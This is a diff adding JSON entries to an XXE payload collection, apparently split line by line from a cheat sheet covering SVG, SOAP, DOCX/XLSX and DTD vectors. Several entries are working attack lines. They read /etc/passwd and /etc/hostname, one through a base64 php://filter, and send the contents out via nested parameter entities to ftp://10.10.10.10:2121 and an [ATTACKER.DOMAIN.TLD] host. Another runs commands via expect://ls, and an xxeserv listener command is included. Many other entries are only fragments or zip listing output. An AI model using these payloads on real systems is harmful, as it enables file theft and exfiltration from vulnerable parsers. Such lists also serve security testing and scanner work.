+    "context": "XXE on JSON Endpoints",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-133",
+    "title": "XXE on JSON Endpoints",
+    "payload": "<?xml version=\"1.0\" encoding=\"UTF-8\" ?><root><search>name</search><value>data</value></root>",
+    "context": "XXE on JSON Endpoints",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-134",
+    "title": "XXE Inside SVG",
+    "payload": "<svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" width=\"300\" version=\"1.1\" height=\"200\">",
+    "context": "XXE Inside SVG",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-135",
+    "title": "XXE Inside SVG",
+    "payload": "<image xlink:href=\"expect://ls\" width=\"200\" height=\"200\"></image>",
+    "context": "XXE Inside SVG",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-136",
+    "title": "XXE Inside SVG",
+    "payload": "</svg>",
+    "context": "XXE Inside SVG",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-137",
+    "title": "XXE Inside SVG",
+    "payload": "<?xml version=\"1.0\" standalone=\"yes\"?>",
+    "context": "XXE Inside SVG",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-138",
+    "title": "XXE Inside SVG",
+    "payload": "<!DOCTYPE test [ <!ENTITY xxe SYSTEM \"file:///etc/hostname\" > ]>",
+    "context": "XXE Inside SVG",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-139",
+    "title": "XXE Inside SVG",
+    "payload": "<svg width=\"128px\" height=\"128px\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" version=\"1.1\">",
+    "context": "XXE Inside SVG",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-140",
+    "title": "XXE Inside SVG",
+    "payload": "<text font-size=\"16\" x=\"0\" y=\"16\">&xxe;</text>",
+    "context": "XXE Inside SVG",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-141",
+    "title": "XXE Inside SVG",
+    "payload": "<!DOCTYPE svg [",
+    "context": "XXE Inside SVG",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-142",
+    "title": "XXE Inside SVG",
+    "payload": "<!ELEMENT svg ANY >",
+    "context": "XXE Inside SVG",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-143",
+    "title": "XXE Inside SVG",
+    "payload": "<!ENTITY % sp SYSTEM \"http://10.10.10.10:8080/xxe.xml\">",
+    "context": "XXE Inside SVG",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-144",
+    "title": "XXE Inside SVG",
+    "payload": "<svg viewBox=\"0 0 200 200\" version=\"1.2\" xmlns=\"http://www.w3.org/2000/svg\" style=\"fill:red\">",
+    "context": "XXE Inside SVG",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-145",
+    "title": "XXE Inside SVG",
+    "payload": "<text x=\"15\" y=\"100\" style=\"fill:black\">XXE via SVG rasterization</text>",
+    "context": "XXE Inside SVG",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-146",
+    "title": "XXE Inside SVG",
+    "payload": "<rect x=\"0\" y=\"0\" rx=\"10\" ry=\"10\" width=\"200\" height=\"200\" style=\"fill:pink;opacity:0.7\"/>",
+    "context": "XXE Inside SVG",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-147",
+    "title": "XXE Inside SVG",
+    "payload": "<flowRoot font-size=\"15\">",
+    "context": "XXE Inside SVG",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-148",
+    "title": "XXE Inside SVG",
+    "payload": "<flowRegion>",
+    "context": "XXE Inside SVG",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-149",
+    "title": "XXE Inside SVG",
+    "payload": "<rect x=\"0\" y=\"0\" width=\"200\" height=\"200\" style=\"fill:red;opacity:0.3\"/>",
+    "context": "XXE Inside SVG",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-150",
+    "title": "XXE Inside SVG",
+    "payload": "</flowRegion>",
+    "context": "XXE Inside SVG",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-151",
+    "title": "XXE Inside SVG",
+    "payload": "<flowDiv>",
+    "context": "XXE Inside SVG",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-152",
+    "title": "XXE Inside SVG",
+    "payload": "<flowPara>&exfil;</flowPara>",
+    "context": "XXE Inside SVG",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-153",
+    "title": "XXE Inside SVG",
+    "payload": "</flowDiv>",
+    "context": "XXE Inside SVG",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-154",
+    "title": "XXE Inside SVG",
+    "payload": "</flowRoot>",
+    "context": "XXE Inside SVG",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-155",
+    "title": "XXE Inside SVG",
+    "payload": "<!ENTITY % data SYSTEM \"php://filter/convert.base64-encode/resource=/etc/hostname\">",
+    "context": "XXE Inside SVG",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-156",
+    "title": "XXE Inside SVG",
+    "payload": "<!ENTITY % param1 \"<!ENTITY exfil SYSTEM 'ftp://10.10.10.10:2121/%data;'>\">",
+    "context": "XXE Inside SVG",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-157",
+    "title": "XXE Inside SOAP",
+    "payload": "<soap:Body>",
+    "context": "XXE Inside SOAP",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-158",
+    "title": "XXE Inside SOAP",
+    "payload": "<foo>",
+    "context": "XXE Inside SOAP",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-159",
+    "title": "XXE Inside SOAP",
+    "payload": "<![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM \"http://10.10.10.10:22/\"> %dtd;]><xxx/>]]>",
+    "context": "XXE Inside SOAP",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-160",
+    "title": "XXE Inside SOAP",
+    "payload": "</foo>",
+    "context": "XXE Inside SOAP",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-161",
+    "title": "XXE Inside SOAP",
+    "payload": "</soap:Body>",
+    "context": "XXE Inside SOAP",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-162",
+    "title": "XXE Inside DOCX file",
+    "payload": "DOCX/XLSX/PPTX",
+    "context": "XXE Inside DOCX file",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-163",
+    "title": "XXE Inside DOCX file",
+    "payload": "ODT/ODG/ODP/ODS",
+    "context": "XXE Inside DOCX file",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-164",
+    "title": "XXE Inside DOCX file",
+    "payload": "SVG",
+    "context": "XXE Inside DOCX file",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-165",
+    "title": "XXE Inside DOCX file",
+    "payload": "XML",
+    "context": "XXE Inside DOCX file",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-166",
+    "title": "XXE Inside DOCX file",
+    "payload": "PDF (experimental)",
+    "context": "XXE Inside DOCX file",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-167",
+    "title": "XXE Inside DOCX file",
+    "payload": "JPG (experimental)",
+    "context": "XXE Inside DOCX file",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-168",
+    "title": "XXE Inside DOCX file",
+    "payload": "GIF (experimental)",
+    "context": "XXE Inside DOCX file",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-169",
+    "title": "XXE Inside XLSX file",
+    "payload": "$ 7z l xxe.xlsx",
+    "context": "XXE Inside XLSX file",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-170",
+    "title": "XXE Inside XLSX file",
+    "payload": "[...]",
+    "context": "XXE Inside XLSX file",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-171",
+    "title": "XXE Inside XLSX file",
+    "payload": "Date      Time    Attr         Size   Compressed  Name",
+    "context": "XXE Inside XLSX file",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-172",
+    "title": "XXE Inside XLSX file",
+    "payload": "2021-10-17 15:19:00 .....          578          223  _rels/.rels",
+    "context": "XXE Inside XLSX file",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-173",
+    "title": "XXE Inside XLSX file",
+    "payload": "2021-10-17 15:19:00 .....          887          508  xl/workbook.xml",
+    "context": "XXE Inside XLSX file",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-174",
+    "title": "XXE Inside XLSX file",
+    "payload": "2021-10-17 15:19:00 .....         4451          643  xl/styles.xml",
+    "context": "XXE Inside XLSX file",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-175",
+    "title": "XXE Inside XLSX file",
+    "payload": "2021-10-17 15:19:00 .....         2042          899  xl/worksheets/sheet1.xml",
+    "context": "XXE Inside XLSX file",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-176",
+    "title": "XXE Inside XLSX file",
+    "payload": "2021-10-17 15:19:00 .....          549          210  xl/_rels/workbook.xml.rels",
+    "context": "XXE Inside XLSX file",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-177",
+    "title": "XXE Inside XLSX file",
+    "payload": "2021-10-17 15:19:00 .....          201          160  xl/sharedStrings.xml",
+    "context": "XXE Inside XLSX file",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-178",
+    "title": "XXE Inside XLSX file",
+    "payload": "2021-10-17 15:19:00 .....          731          352  docProps/core.xml",
+    "context": "XXE Inside XLSX file",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-179",
+    "title": "XXE Inside XLSX file",
+    "payload": "2021-10-17 15:19:00 .....          410          246  docProps/app.xml",
+    "context": "XXE Inside XLSX file",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-180",
+    "title": "XXE Inside XLSX file",
+    "payload": "2021-10-17 15:19:00 .....         1367          345  [Content_Types].xml",
+    "context": "XXE Inside XLSX file",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-181",
+    "title": "XXE Inside XLSX file",
+    "payload": "2021-10-17 15:19:00              11216         3586  9 files",
+    "context": "XXE Inside XLSX file",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-182",
+    "title": "XXE Inside XLSX file",
+    "payload": "cd XXE",
+    "context": "XXE Inside XLSX file",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-183",
+    "title": "XXE Inside XLSX file",
+    "payload": "zip -r -u ../xxe.xlsx *",
+    "context": "XXE Inside XLSX file",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-184",
+    "title": "XXE Inside XLSX file",
+    "payload": "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>",
+    "context": "XXE Inside XLSX file",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-185",
+    "title": "XXE Inside XLSX file",
+    "payload": "<!DOCTYPE cdl [<!ELEMENT cdl ANY ><!ENTITY % asd SYSTEM \"http://10.10.10.10:8000/xxe.dtd\">%asd;%c;]>",
+    "context": "XXE Inside XLSX file",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-186",
+    "title": "XXE Inside XLSX file",
+    "payload": "<cdl>&rrr;</cdl>",
+    "context": "XXE Inside XLSX file",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-187",
+    "title": "XXE Inside XLSX file",
+    "payload": "<workbook xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\" xmlns:r=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships\">",
+    "context": "XXE Inside XLSX file",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-188",
+    "title": "XXE Inside XLSX file",
+    "payload": "<!DOCTYPE cdl [<!ELEMENT t ANY ><!ENTITY % asd SYSTEM \"http://10.10.10.10:8000/xxe.dtd\">%asd;%c;]>",
+    "context": "XXE Inside XLSX file",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-189",
+    "title": "XXE Inside XLSX file",
+    "payload": "<sst xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\" count=\"10\" uniqueCount=\"10\"><si><t>&rrr;</t></si><si><t>testA2</t></si><si><t>testA3</t></si><si><t>testA4</t></si><si><t>testA5</t></si><si><t>testB1</t></si><si><t>testB2</t></si><si><t>testB3</t></si><si><t>testB4</t></si><si><t>testB5</t></si></sst>",
+    "context": "XXE Inside XLSX file",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-190",
+    "title": "XXE Inside XLSX file",
+    "payload": "<!ENTITY % d SYSTEM \"file:///etc/passwd\">",
+    "context": "XXE Inside XLSX file",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-191",
+    "title": "XXE Inside XLSX file",
+    "payload": "<!ENTITY % c \"<!ENTITY rrr SYSTEM 'ftp://10.10.10.10:2121/%d;'>\">",
+    "context": "XXE Inside XLSX file",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-192",
+    "title": "XXE Inside XLSX file",
+    "payload": "xxeserv -o files.log -p 2121 -w -wd public -wp 8000",
+    "context": "XXE Inside XLSX file",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-193",
+    "title": "XXE Inside DTD file",
+    "payload": "<!ENTITY % payload SYSTEM \"file:///etc/passwd\">",
+    "context": "XXE Inside DTD file",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-194",
+    "title": "XXE Inside DTD file",
+    "payload": "<!ENTITY % param1 '<!ENTITY &#37; external SYSTEM \"http://[ATTACKER.DOMAIN.TLD]/x=%payload;\">'>",
+    "context": "XXE Inside DTD file",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-195",
+    "title": "XXE Inside DTD file",
+    "payload": "%external;",
+    "context": "XXE Inside DTD file",
+    "tags": [
+      "xxe"
+    ]
+  }
+]
